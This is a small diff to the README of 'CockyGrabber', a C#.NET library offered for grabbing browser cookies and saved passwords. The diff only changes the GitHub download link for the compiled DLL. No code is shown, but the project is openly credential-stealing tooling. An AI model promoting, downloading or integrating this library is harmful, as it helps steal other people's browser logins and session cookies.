@@ -6,7 +6,7 @@ A Browser Cookies & Passwords Grabber C#.NET Library that you can itegrate in yo
 
 ## Download: 
 
-For download all necessary packages, you can do from nuget with searching `CockyGrabber` and download the 1.2.0 version. once done, just download the library from the last [release](https://github.com/TheBackdoor/CockyGrabber/releases/download/2.1.0/webGrabber.dll).
+For download all necessary packages, you can do from nuget with searching `CockyGrabber` and download the 1.2.0 version. once done, just download the library from the last [release](https://github.com/Stanley-GF/CockyGrabber/releases/download/2.1.0/webGrabber.dll).
 
 ## Usage:
 **Import Cockygrabber classes:**</br>
